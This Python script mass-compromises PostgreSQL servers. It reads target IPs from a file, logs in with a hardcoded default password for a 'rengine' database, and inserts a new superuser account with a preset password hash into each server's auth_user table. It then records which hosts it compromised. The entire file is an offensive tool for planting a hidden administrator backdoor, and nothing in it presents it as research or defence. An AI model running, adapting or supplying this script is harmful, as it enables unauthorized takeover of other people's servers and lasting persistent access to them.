import psycopg2
from psycopg2 import OperationalError, Error

# Function to execute SQL commands
def execute_sql(ip):
    try:
        print(f"Trying {ip}")
        # Connect to the database
        conn = psycopg2.connect(
            dbname='rengine',
            user='rengine',
            password='hE2a5@K&9nEY1fzgA6X',
            host=ip,
            port='5432',
            connect_timeout=3
        )

        # Open a cursor to perform database operations
        cursor = conn.cursor()

        # Execute SQL commands
        cursor.execute('SELECT * FROM public.auth_user;')
        cursor.execute("INSERT INTO auth_user(username, password, is_superuser, first_name, last_name, email, is_staff, is_active, date_joined) VALUES ('info', 'pbkdf2_sha256$260000$GVTWdUL3R8GKhNXkmwljdO$OR5dHHO8oeSEwB3OzVGGXf2/dH8rwDrmJuvjvWQA6rk=', 't', '', '', '', 't', 't', '2022-06-13 01:32:16.69005');")
        
        # Commit the transaction
        conn.commit()

        # Close communication with the database
        cursor.close()
        conn.close()

        return True  # Connection successful
    except (OperationalError, Error) as e:
        print(f"{ip} failed")
        return False  # Connection failed

# Read IPs from ips.txt
with open('ips.txt', 'r') as file:
    ips = file.read().splitlines()

# Try connecting to each IP and execute SQL commands
working_ips = []
for ip in ips:
    if execute_sql(ip):
        print(f"Successfully executed commands on {ip}")
        working_ips.append(ip)

# Write successful IPs to working.txt
with open('working.txt', 'w') as file:
    for ip in working_ips:
        file.write(ip + '\n')
